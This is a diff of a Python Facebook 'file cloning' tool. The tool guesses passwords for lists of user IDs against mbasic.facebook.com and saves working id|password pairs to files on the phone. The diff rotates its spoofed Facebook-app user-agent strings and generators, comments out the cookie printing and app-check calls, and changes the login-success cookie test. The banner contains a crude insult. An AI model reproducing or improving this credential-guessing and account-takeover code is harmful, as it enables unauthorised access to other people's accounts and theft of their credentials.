@@ -28,61 +28,42 @@ ani=('Fariya')
 love=('mbasic')
 ugen=[]
 ugen=[]
-header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
-#header_grup = {'User-Agent': ''Dalvik/2.1.0 (Linux; U; Android 5; ARE-L22HN Build/QP1A.521094.694) [FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/353870778;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/354800271;FBCR/NTT DOCOMO;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1983;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; ELEMENT PLAY Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; C60 Ultra Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; moto g(20) Build/RTAS31.68-66-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36"}
+header_grup = {"user-agent": 'Mozilla/5.0 (Linux; Android 13; SM-G980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]'
+header_grup = {"user-agent": 'Mozilla/5.0 (Linux; Android 11; V2101 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/285.0.0.13.118;]'
+header_grup = {"user-agent": 'Mozilla/5.0 (Linux; Android 12; CPH2223 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'
 for xd in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
+        aa='Mozilla/5.0 (Linux; Android 13; SM-G980F Build/TP1A.220624.014; wv)'
         b=random.choice(['6','7','8','9','10','11','12',])
         c=f' TL-tl; {str(gt)}'
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0'
         h=random.randrange(73,100)
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]'
+        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]'
         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
 
 for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/QP1A.190711.020; wv)'
+        aa='Mozilla/5.0 (Linux; Android 11; V2101 Build/RP1A.200720.012; wv)'
         b=random.choice(['6','7','8','9','10','11','12'])
-        c='Android 10; TECNO KE7 Build/'
+        c='Android 11; V2101 Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106'
         h=random.randrange(73,100)
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]'
+        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/285.0.0.13.118;]'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
         
 for agent in range(10000):
-        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)'
+        aa='Mozilla/5.0 (Linux; Android 12; CPH2223 Build/RKQ1.211119.001; wv)'
         b=random.choice(['6','7','8','9','10','11','12'])
-        c='CPU iPhone OS 14_4 like Mac OS X'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)      
-
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
+        c='Android 12; CPH2223 Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -91,60 +72,9 @@ for agent in range(10000):
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]'
+        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)      
-
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 10; ELEMENT PLAY Build/QP1A.190711.020; wv)'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='Android 10; ELEMENT PLAY Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/115.0.5790.168;]'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
-        
-        
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 11; C60 Ultra Build/RP1A.201005.001; wv)'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='Android 11; C60 Ultra Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/115.0.5790.168;]'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
-        
-        
-for agent in range(10000):
-        aa='Android 11; moto g(20) Build/RTAS31.68-66-3; wv)'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='Android 11; moto g(20) Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/117.0.0.0;]'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
-
 
  # CLEAR
 def clear():
@@ -185,15 +115,15 @@ logo =("""          \033[1;37m____ \033[1;32m                       \033[1;37m__
 
             \033[1;37m \033[1;36m\033[1;37m═\033[44m\033[1;37m[ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 𝐰𝐨𝐫𝐥𝐝🌍 ]\x1b[0m═\033[1;36m\033[1;37m
     
-\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mRJ ✯ SHANTO\033[1;37m════ ════\033[1;36m════════\033[1;37m╗
+\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mRJ ✯ SHANTO\033[1;37m══════════\033[1;36m════════\033[1;37m╗
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴀᴜᴛʜᴏʀ]\033[1;31m  ➟  \033[1;32mSH4N7O-KING        \033[1;31m       │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ꜰᴀᴄᴇʙᴏᴏᴋ]\033[1;31m➟  \033[1;32mSH4N7O-KING         \033[1;31m      │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m SH4N7O-KING                  \033[1;31m        │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴠᴇʀꜱᴏɴ]\033[1;31m  ➟  \033[1;32m0.1                          \033[1;31m      │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴡʜᴀᴛꜱᴀᴘᴘ]\033[1;31m➟  \033[1;32m0131*86*23*\033[1;37m \033[1;36m \033[1;37m \033[1;31m                     │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴡʜᴀᴛꜱᴀᴘᴘ]\033[1;31m➟  \033[1;32m0131*86*23*\033[1;37m \033[1;36m \033[1;37m \033[1;31m                               │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɴᴇᴛᴡᴏʀᴋ]\033[1;31m ➟  \033[1;32m3G,4G,5G \033[1;37m {\033[1;36mON Mobile Data\033[1;37m} \033[1;31m        │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴄᴏɴᴛᴀᴄᴛ]\033[1;31m ➟  \033[1;32m😍😍😍😍😍😍😍\033[1;37m \033[1;36m\033[1;37m \033[1;31m │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴛᴏᴏʟꜱ]\033[1;31m   ➟  \033[1;32mFILE CLONING \033[1;37m  \033[1;31m                    │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴄᴏɴᴛᴀᴄᴛ]\033[1;31m ➟  \033[1;32m😍😍😍😍😍😍😍\033[1;37m \033[1;36m\033[1;37m \033[1;31m                      │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴛᴏᴏʟꜱ]\033[1;31m   ➟  \033[1;32mFILE CLONING \033[1;37m  \033[1;31m                                      │
 \033[1;37m╚\033[1;36m════\033[1;37m═════\033[41m\033[1;37m[ NA XUDI FMZ NA XUDI CELEBRITY🖕 ]\x1b[0m═════\033[1;36m═════\033[1;37m╝
 \033[1;31m========================================================""")           
 def linex():
@@ -344,8 +274,8 @@ def m3(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SH4N7O\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/SH4N7O•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -387,8 +317,8 @@ def m2(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SH4N7O\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/SH4N7O•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -426,7 +356,7 @@ def m4(ids,names,passlist):
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SH4N7O=session.cookies.get_dict().keys()
-                        if "c_user" in SH4N7O:
+                        if "datr" in SH4N7O:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SH4N7O\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
